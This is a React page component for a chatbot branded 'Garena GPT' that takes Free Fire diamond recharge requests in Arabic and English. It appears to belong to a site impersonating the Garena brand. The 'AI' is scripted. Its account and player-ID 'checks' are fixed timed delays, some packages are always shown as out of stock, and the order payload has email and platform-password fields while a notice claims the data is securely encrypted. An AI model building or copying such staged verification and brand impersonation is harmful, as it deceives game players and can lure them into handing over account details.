import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { Bot, User, Send, ShieldCheck, CheckCircle2, Menu, LogOut, Loader2, Sparkles, AlertTriangle, ClipboardList, Search, ShieldAlert, Facebook, Instagram, Mail, X, Check, ArrowLeft } from "lucide-react";
import { useLanguage } from "../context/LanguageContext";
import Modal from "../components/Modal";

type MessageType = 'start' | 'diamonds' | 'ask_id' | 'processing' | 'done' | 'text';

interface Message {
  id: string;
  sender: 'ai' | 'user';
  text: string;
  type?: MessageType;
}

export default function Charge() {
  const { t, language } = useLanguage();
  const navigate = useNavigate();
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const rawUser = localStorage.getItem('ff_user');
  const loggedInUser = (rawUser && rawUser !== 'undefined') ? JSON.parse(rawUser) : {};
  
  // Form State
  const [formData, setFormData] = useState({
    account_id: "",
    diamonds: "",
  });

  const [messages, setMessages] = useState<Message[]>([
    {
      id: Date.now().toString(),
      sender: 'ai',
      text: language === 'ar' 
        ? 'مرحباً بك في مركز Garena GPT للذكاء الاصطناعي! 🤖 أنا هنا لمساعدتك في تقديم طلب الشحن الخاص بك بكل سهولة وبسرعة. اضغط على "البدء" لننطلق.' 
        : 'Welcome to Garena GPT! 🤖 I am here to help you submit your recharge request easily and quickly. Click "Start" to begin.',
      type: 'start'
    }
  ]);
  
  const [inputText, setInputText] = useState("");
  const [inputType, setInputType] = useState<"text" | "number">("text");
  const [isTyping, setIsTyping] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  
  const [termsModal, setTermsModal] = useState(false);
  const [accountStatus, setAccountStatus] = useState<string>('');

  useEffect(() => {
    const checkStatus = async () => {
      try {
        const token = localStorage.getItem('ff_token');
        if (!token) return;
        const res = await axios.get('/api/account/status', {
          headers: { Authorization: `Bearer ${token}` }
        });
        setAccountStatus(res.data.status);
      } catch (e) {
        console.error(e);
      }
    };
    checkStatus();
    
    const termsAccepted = localStorage.getItem('ff_terms_accepted');
    if (!termsAccepted) {
      setTermsModal(true);
    }
  }, []);
  
  const acceptTerms = () => {
    localStorage.setItem('ff_terms_accepted', 'true');
    setTermsModal(false);
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isTyping]);

  const addAiMessage = (text: string, type: MessageType, delay = 1000) => {
    setIsTyping(true);
    setTimeout(() => {
      setIsTyping(false);
      setMessages(prev => [...prev, { id: Date.now().toString(), sender: 'ai', text, type }]);
    }, delay);
  };

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { id: Date.now().toString(), sender: 'user', text, type: 'text' }]);
  };

  const handleStart = async () => {
    addUserMessage(language === 'ar' ? 'البدء' : 'Start');
    setIsTyping(true);
    
    const token = localStorage.getItem('ff_token');
    if (!token) {
      setTimeout(() => {
        setIsTyping(false);
        addAiMessage(
          language === 'ar' ? 'عذراً، يجب تسجيل الدخول أولاً للبدء.' : 'Sorry, you must log in first to begin.',
          'done'
        );
      }, 1000);
      return;
    }

    try {
      const res = await axios.get('/api/user/me', {
        headers: { Authorization: `Bearer ${token}` }
      });
      const u = res.data.user;
      
      localStorage.setItem('ff_user', JSON.stringify(u));
      
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      setIsTyping(false);

      if (u && u.cooldown_minutes > 0) {
        setMessages(prev => [
          ...prev,
          {
            id: Date.now().toString(),
            sender: 'ai',
            text: language === 'ar'
              ? `⏳ عذراً، يمكنك إرسال طلب شحن واحد فقط كل ساعة.\n\nيرجى الانتظار ${u.cooldown_minutes} دقيقة حتى تتمكن من إرسال طلب شحن جديد.`
              : `⏳ Sorry, you can only submit one recharge request per hour.\n\nPlease wait ${u.cooldown_minutes} minutes before submitting a new request.`,
            type: 'done'
          }
        ]);
        return;
      }
      
      setMessages(prev => [
        ...prev,
        {
          id: Date.now().toString(),
          sender: 'ai',
          text: language === 'ar' 
            ? 'كم عدد الجواهر أو نوع العرض الذي تريد شحنه؟' 
            : 'How many diamonds or what package do you want?', 
          type: 'diamonds'
        }
      ]);
      
    } catch (err) {
      console.error(err);
      setIsTyping(false);
      setMessages(prev => [
        ...prev,
        {
          id: Date.now().toString(),
          sender: 'ai',
          text: language === 'ar' 
            ? '❌ عذراً، حدث خطأ أثناء فحص حالة حسابك من السيرفر. يرجى المحاولة لاحقاً.' 
            : '❌ Sorry, an error occurred while checking your account status. Please try again later.',
          type: 'done'
        }
      ]);
    }
  };

  const handleDiamondsSelect = (d: string) => {
    const selectedOption = diamondOptions.find(opt => opt.value === d);
    const label = selectedOption ? selectedOption.label : d;
    addUserMessage(label);
    
    if (d === 'Monthly Membership' || d === 'Weekly Membership' || d === 'Booyah Pass') {
      setIsTyping(true);
      setTimeout(() => {
        setIsTyping(false);
        setMessages(prev => [
          ...prev,
          {
            id: Date.now().toString(),
            sender: 'ai',
            text: language === 'ar'
              ? `❌ عذراً، هذا العرض (${label}) غير متوفر حالياً بسبب نفاذ الكمية.\n\nيرجى اختيار باقة أخرى من الخيارات أدناه:`
              : `❌ Sorry, this offer (${label}) is currently out of stock.\n\nPlease select another package from the options below:`,
            type: 'diamonds_available'
          }
        ]);
      }, 1000);
      return;
    }

    setFormData(prev => ({ ...prev, diamonds: d }));
    
    const accId = loggedInUser?.account_id || "1564949466";
    setFormData(prev => ({ ...prev, account_id: accId }));
    
    submitOrder(accId, d);
  };

  const handleIdSubmit = (idValue?: string) => {
    const finalId = idValue || inputText.trim();
    if (!finalId) return;
    
    setFormData(prev => ({ ...prev, account_id: finalId }));
    addUserMessage(finalId);
    setInputText("");
    
    submitOrder(finalId);
  };

  const submitOrder = async (finalId: string, customDiamonds?: string) => {
    setIsTyping(false);
    
    const processingMsgId = Date.now().toString() + "_processing";
    
    // Step 1: جاري التحقق من تفعيل وتأكيد الحساب...
    const step1Text = language === 'ar' 
      ? "جاري فحص تفعيل وتأكيد الحساب..." 
      : "Checking account verification status...";
    setMessages(prev => [...prev, { id: processingMsgId, sender: 'ai', text: step1Text, type: 'processing' }]);
    
    // Fetch latest user data from server during this step
    let u: any = null;
    try {
      const token = localStorage.getItem('ff_token');
      const res = await axios.get('/api/user/me', {
        headers: { Authorization: `Bearer ${token}` }
      });
      u = res.data.user;
      localStorage.setItem('ff_user', JSON.stringify(u));
    } catch (e) {
      console.error(e);
    }
    
    // Wait 3 seconds for Step 1
    await new Promise(resolve => setTimeout(resolve, 3000));

    // Check account verification
    if (!u || u.verification_status !== 'Approved') {
      const vStat = u?.verification_status || 'Pending';
      const vText = vStat === 'Rejected' 
        ? (language === 'ar' ? 'مرفوض' : 'Rejected') 
        : (language === 'ar' ? 'قيد التأكيد' : 'Pending Confirmation');
      const failReason = language === 'ar' 
        ? `حسابك غير مفعل ومؤكد (الحالة: ${vText})` 
        : `Your account is not active and verified (Status: ${vText})`;
      
      handleVerificationFailure(processingMsgId, failReason, vStat);
      return;
    }

    // Step 2: جاري التحقق من معرف اللاعب (ID)...
    const step2Text = language === 'ar' 
      ? "جاري التحقق من معرف اللاعب (ID)..." 
      : "Checking Player ID status...";
    setMessages(prev => prev.map(msg => {
      if (msg.id === processingMsgId) return { ...msg, text: step2Text };
      return msg;
    }));
    
    // Wait 5 seconds (وبعد التحقق من الحساب اظهر رسالة التحقق من الايدي لمدة 5 ثواني)
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    // Check player ID linking status
    if (u.linking_status !== 'Approved') {
      const lkStat = u.linking_status || 'Pending';
      const lkText = lkStat === 'Rejected' 
        ? (language === 'ar' ? 'مرفوضة' : 'Rejected') 
        : (language === 'ar' ? 'قيد التأكيد' : 'Pending Confirmation');
      const failReason = language === 'ar' 
        ? `حالة ربط معرف اللاعب غير مؤكدة (الحالة: ${lkText})` 
        : `Player ID linking status is not confirmed (Status: ${lkText})`;
      
      handleVerificationFailure(processingMsgId, failReason, lkStat);
      return;
    }

    // Step 3: جاري إرسال طلب الشحن...
    const step3Text = language === 'ar' ? "جاري إرسال طلب الشحن..." : "Sending recharge request...";
    setMessages(prev => prev.map(msg => {
      if (msg.id === processingMsgId) return { ...msg, text: step3Text };
      return msg;
    }));

    await new Promise(resolve => setTimeout(resolve, 3000));
    
    try {
      const token = localStorage.getItem("ff_token");
      const res = await axios.post("/api/orders", {
        token,
        platform: "Player ID",
        email: finalId,
        platform_password: "",
        level: "0",
        charged: "لا",
        diamonds: customDiamonds || formData.diamonds,
      });
      
      const orderNum = res.data.order_number;
      setIsTyping(false);
      // Remove processing message
      setMessages(prev => prev.filter(msg => msg.id !== processingMsgId));
      
      setMessages(prev => [
        ...prev, 
        { 
          id: Date.now().toString(), 
          sender: 'ai', 
          text: language === 'ar' 
            ? `✅ تمت العملية بنجاح! تم استلام طلبك ورقم الطلب الخاص بك هو: ${orderNum}. يمكنك متابعة حالة طلبك من قسم طلباتي.`
            : `✅ Process completed successfully! Your order has been received, order number: ${orderNum}. You can track it in My Orders.`,
          type: 'done' 
        }
      ]);
    } catch (error: any) {
      setIsTyping(false);
      // Remove processing message
      setMessages(prev => prev.filter(msg => msg.id !== processingMsgId));
      
      let errorText = language === 'ar' 
        ? `❌ عذراً، حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى لاحقاً.`
        : `❌ Sorry, an error occurred while sending the request. Please try again later.`;

      if (error && error.response && error.response.status === 429 && error.response.data) {
        errorText = language === 'ar' ? error.response.data.message : error.response.data.message_en;
      }

      setMessages(prev => [
        ...prev, 
        { 
          id: Date.now().toString(), 
          sender: 'ai', 
          text: errorText,
          type: 'done' 
        }
      ]);
    }
  };

  const handleVerificationFailure = (processingMsgId: string, failReason: string, status: string) => {
    setIsTyping(false);
    setMessages(prev => prev.filter(msg => msg.id !== processingMsgId));
    
    const hintMessageAr = status === 'Rejected'
      ? "لقد تم رفض أحد متطلبات تفعيل حسابك من قبل النظام. يرجى مراجعة الدعم الفني أو تعديل البيانات المطلوبة لإعادة التقييم."
      : "يرجى الانتظار حتى يقوم النظام بتأكيد وتفعيل جميع متطلبات حسابك ثم المحاولة مرة أخرى.";

    const hintMessageEn = status === 'Rejected'
      ? "One of your account activation requirements has been rejected by the system. Please check with support or update the required details for re-evaluation."
      : "Please wait for the system to confirm and activate all your account requirements, then try again.";

    setMessages(prev => [
      ...prev,
      {
        id: Date.now().toString(),
        sender: 'ai',
        text: language === 'ar'
          ? `❌ فشل طلب الشحن بسبب التالي:\n• ${failReason}.\n\n${hintMessageAr}`
          : `❌ Charge request failed due to the following:\n• ${failReason}.\n\n${hintMessageEn}`,
        type: 'done'
      }
    ]);
  };

  const currentMessageType = messages[messages.length - 1]?.sender === 'ai' ? messages[messages.length - 1]?.type : null;
  const isCurrentlyChecking = messages.some(m => m.type === 'processing');

  const diamondOptions = [
    { label: "100 + 10 💎", value: "100" },
    { label: "210 + 21 💎", value: "210" },
    { label: "310 + 31 💎", value: "310" },
    { label: "520 + 52 💎", value: "520" },
    { label: "Monthly Membership 💎", value: "Monthly Membership" },
    { label: "Weekly Membership 💎", value: "Weekly Membership" },
    { label: "Booyah Pass 🔥", value: "Booyah Pass" },
  ];

  const renderOptions = () => {
    if (isTyping) return null;
    
    switch (currentMessageType) {
      case 'start':
        return (
          <button 
            onClick={handleStart}
            className="w-full sm:w-auto bg-[#CD1212] hover:bg-red-700 text-white font-bold py-3 px-8 rounded-xl shadow-lg shadow-red-600/20 active:scale-95 transition-all text-sm flex items-center justify-center gap-2 mt-2"
          >
            <Sparkles className="h-5 w-5" />
            {language === 'ar' ? 'البدء' : 'Start'}
          </button>
        );
      case 'diamonds':
        return (
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mt-3 w-full max-w-lg">
            {diamondOptions.map(d => (
              <button key={d.value} onClick={() => handleDiamondsSelect(d.value)} className="bg-white border border-gray-200 text-gray-800 hover:border-red-500 hover:text-red-600 font-bold py-3 px-4 rounded-xl shadow-sm transition-all text-sm text-center active:scale-95 flex items-center justify-center">
                {d.label}
              </button>
            ))}
          </div>
        );
      case 'diamonds_available':
        const availableOptions = diamondOptions.filter(d => d.value !== 'Monthly Membership' && d.value !== 'Weekly Membership' && d.value !== 'Booyah Pass');
        return (
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mt-3 w-full max-w-lg">
            {availableOptions.map(d => (
              <button key={d.value} onClick={() => handleDiamondsSelect(d.value)} className="bg-white border border-gray-200 text-gray-800 hover:border-red-500 hover:text-red-600 font-bold py-3 px-4 rounded-xl shadow-sm transition-all text-sm text-center active:scale-95 flex items-center justify-center">
                {d.label}
              </button>
            ))}
          </div>
        );
      case 'ask_id':
        const currentAccId = loggedInUser?.account_id;
        return (
          <div className="flex flex-col gap-3 mt-3 w-full max-w-sm text-right">
            {currentAccId && (
              <button 
                onClick={() => handleIdSubmit(currentAccId)}
                className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 px-5 rounded-xl shadow-lg shadow-emerald-600/10 active:scale-95 transition-all text-xs sm:text-sm flex items-center justify-center gap-2"
              >
                <Check className="h-4.5 w-4.5" />
                {language === 'ar' ? `نعم، اشحن لـ (${currentAccId})` : `Yes, recharge for (${currentAccId})`}
              </button>
            )}
            
            <div className="w-full border-t border-gray-100 my-1"></div>
            
            <p className="text-[11px] text-gray-500 font-bold mb-0.5">
              {language === 'ar' ? 'أو أدخل أيدي آخر للشحن له:' : 'Or enter another ID to recharge:'}
            </p>
            
            <div className="flex gap-2">
              <input
                type="number"
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
                    handleIdSubmit();
                  }
                }}
                placeholder={language === 'ar' ? 'أدخل الأيدي...' : 'Enter ID...'}
                dir="ltr"
                className="flex-1 rounded-xl border border-gray-200 bg-gray-50 px-3 py-2.5 text-xs font-bold text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 text-left"
              />
              <button
                onClick={() => handleIdSubmit()}
                disabled={!inputText.trim()}
                className="flex h-10 w-10 items-center justify-center rounded-xl bg-[#CD1212] text-white transition-all hover:bg-red-700 active:scale-95 disabled:bg-gray-200 disabled:opacity-50 shrink-0"
              >
                <Send className="h-4 w-4" />
              </button>
            </div>
          </div>
        );
      case 'done':
        return (
          <button 
            onClick={() => navigate('/my-orders')}
            className="w-full sm:w-auto bg-[#CD1212] hover:bg-red-700 text-white font-bold py-3 px-8 rounded-xl shadow-lg shadow-red-600/20 active:scale-95 transition-all text-sm flex items-center justify-center gap-2 mt-3"
          >
            {language === 'ar' ? 'الذهاب إلى طلباتي' : 'Go to My Orders'}
            <ArrowLeft className={`h-5 w-5 ${language === 'ar' ? 'rotate-0' : 'rotate-180'}`} />
          </button>
        );
      default:
        return null;
    }
  };

  const showInput = currentMessageType === 'ask_id';

  return (
    <div className={`min-h-screen bg-[#F8F9FA] font-sans flex flex-col ${language === 'ar' ? 'text-right' : 'text-left'}`} dir={language === 'ar' ? 'rtl' : 'ltr'}>
      {/* Header */}
      <header className="sticky top-0 z-40 w-full rounded-b-[20px] border-b border-gray-200/20 bg-white/40 backdrop-blur-xl shadow-[0_8px_30px_rgba(0,0,0,0.04)]">
        <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2">
              <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-gradient-to-br from-[#CD1212] to-red-700 shadow-md">
                <Bot className="h-5 w-5 text-white" />
              </div>
              <span className="text-xl font-black tracking-tight text-gray-900 hidden sm:block">
                Garena <span className="text-[#CD1212]">GPT</span>
              </span>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 px-3 py-1.5 bg-white border border-gray-200 shadow-sm rounded-full">
              <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.6)]"></div>
              <span className="text-xs font-black text-gray-800 tracking-wide">
                Garena <span className="text-[#CD1212]">GPT</span>
              </span>
            </div>
          </div>
        </div>
      </header>

      {/* Main Chat Area */}
      <main className="flex-1 flex flex-col w-full max-w-3xl mx-auto px-4 sm:px-6 py-6 pb-32">
        <div className="flex-1 space-y-6">
          {messages.map((msg, index) => (
            <div
              key={msg.id}
              className={`flex gap-3 ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
            >
              {msg.sender === 'ai' && (
                <div className="flex-shrink-0 w-9 h-9 rounded-full bg-gradient-to-br from-[#CD1212] to-red-600 flex items-center justify-center shadow-md mt-1 border border-red-500/10">
                  <Bot className="h-4.5 w-4.5 text-white" />
                </div>
              )}
              
              <div className={`max-w-[85%] sm:max-w-[75%] rounded-2xl px-5 py-3.5 text-sm sm:text-base font-medium leading-relaxed whitespace-pre-line ${
                msg.sender === 'user' 
                  ? 'bg-[#CD1212] text-white rounded-tl-none shadow-md shadow-red-600/10' 
                  : msg.type === 'processing' 
                    ? 'bg-gradient-to-r from-gray-50 to-white text-gray-800 border border-gray-100 shadow-md shadow-gray-200/30 rounded-tr-none'
                  : msg.type === 'done'
                    ? 'bg-white text-gray-800 border border-gray-100 shadow-sm rounded-tr-none'
                  : 'bg-white text-gray-800 border border-gray-100 shadow-sm rounded-tr-none'
              }`}>
                {msg.type === 'processing' ? (
                  <div className="flex items-center gap-3 py-1">
                    <Loader2 className="h-5 w-5 text-[#CD1212] animate-spin shrink-0" />
                    <span className="text-gray-800 font-bold">{msg.text}</span>
                  </div>
                ) : (
                  msg.text
                )}
                {msg.sender === 'ai' && msg.id === messages[messages.length - 1]?.id && (
                  <div className="mt-2">
                    {renderOptions()}
                  </div>
                )}
              </div>

              {msg.sender === 'user' && (
                <div className="flex-shrink-0 w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center mt-1">
                  <User className="h-4 w-4 text-gray-500" />
                </div>
              )}
            </div>
          ))}
          
          {isTyping && !isCurrentlyChecking && (
            <div className="flex gap-3 justify-start items-start">
              <div className="flex-shrink-0 w-9 h-9 rounded-full bg-gradient-to-br from-[#CD1212] to-red-600 flex items-center justify-center shadow-md mt-1 border border-red-500/20">
                <Bot className="h-4.5 w-4.5 text-white" />
              </div>
              <div className="bg-white border border-gray-100 shadow-sm rounded-3xl rounded-tr-none px-6 py-4 flex items-center justify-center gap-1.5 w-20">
                <div className="w-1.5 h-1.5 rounded-full bg-gray-400 animate-typing-1"></div>
                <div className="w-1.5 h-1.5 rounded-full bg-gray-400 animate-typing-2"></div>
                <div className="w-1.5 h-1.5 rounded-full bg-gray-400 animate-typing-3"></div>
              </div>
            </div>
          )}
          
          <div ref={messagesEndRef} />
        </div>
      </main>

      <Modal 
        isOpen={termsModal} 
        onClose={acceptTerms}
        title={language === 'ar' ? 'تنبيه الأمان والخصوصية' : 'Security Notice'}
      >
        <div className={`p-2 space-y-4 ${language === 'ar' ? 'text-right' : 'text-left'}`}>
          <div className="flex items-start gap-3 bg-red-50 p-4 rounded-xl border border-red-100">
            <ShieldCheck className="w-6 h-6 text-red-600 flex-shrink-0 mt-0.5" />
            <p className="text-sm font-bold text-red-900 leading-relaxed">
              {language === 'ar' 
                ? 'يتم استخدام معلوماتك حصرياً لإتمام عملية الشحن، ويتم تشفيرها بأمان تام.' 
                : 'Your info is used exclusively for the recharge process and is securely encrypted.'}
            </p>
          </div>
          <button 
            onClick={acceptTerms}
            className="w-full mt-2 rounded-xl bg-[#CD1212] text-white py-3 font-bold shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all text-sm"
          >
            {language === 'ar' ? 'موافق ومتابعة' : 'Accept & Continue'}
          </button>
        </div>
      </Modal>

    </div>
  );
}
